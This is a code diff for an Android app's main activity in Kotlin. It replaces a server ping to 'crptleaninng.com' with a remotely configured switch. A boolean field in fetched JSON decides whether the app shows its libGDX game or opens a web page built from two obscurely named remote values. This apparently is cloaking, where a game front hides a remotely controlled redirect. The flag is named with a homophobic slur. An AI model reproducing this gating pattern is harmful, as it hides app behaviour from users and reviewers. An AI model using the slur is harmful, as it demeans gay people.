@@ -31,10 +31,7 @@ import kotlinx.coroutines.flow.MutableSharedFlow
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import okhttp3.OkHttpClient
-import okhttp3.Request
 import org.json.JSONObject
-import java.io.IOException
 import kotlin.system.exitProcess
 
 class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
@@ -70,7 +67,7 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
             coroutine.launch(Dispatchers.IO) {
 
                 //startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
-                getResponseFromServer()
+                checkDataStore()
 
                 launch(Dispatchers.Main) {
                     startFragmentIdFlow.collect { fragmentId ->
@@ -158,31 +155,6 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         }
     }
 
-    private fun getResponseFromServer() {
-        val client = OkHttpClient()
-        val request: Request = Request.Builder()
-            .url("https://crptleaninng.com/")
-            .build()
-
-        try {
-            client.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    log("getResponseFromServer SUCCESS code = ${response.code}")
-                    if (response.code == 200) checkDataStore() else startFragmentIdFlow.tryEmit(
-                        R.id.libGDXFragment
-                    )
-                } else {
-                    log("getResponseFromServer newCall FAIL: ${response.code} ${response.message}")
-                    startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
-                }
-            }
-        } catch (e: IOException) {
-            log("getResponseFromServer FAIL: $e")
-            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
-
-        }
-    }
-
     private fun checkDataStore() {
         coroutine.launch(Dispatchers.IO) {
             when (DataStoreManager.Key.get()) {
@@ -218,12 +190,14 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
                     val jsonData = getString("CryptoEducationData")
                     log("success = $jsonData")
                     JSONObject(jsonData).also { jsonObj ->
-                        coroutine.launch(Dispatchers.IO) {
-                            buildSsilkaAndOpenWeb(
-                                jsonObj.getString("pesochnaya_devochka"),
-                                jsonObj.getString("wate_milk_shake"),
-                            )
-                        }
+                        if (jsonObj.getBoolean("flagIsPidar")) {
+                            coroutine.launch(Dispatchers.IO) {
+                                buildSsilkaAndOpenWeb(
+                                    jsonObj.getString("pesochnaya_devochka"),
+                                    jsonObj.getString("wate_milk_shake"),
+                                )
+                            }
+                        } else startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                     }
                 } else {
                     startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
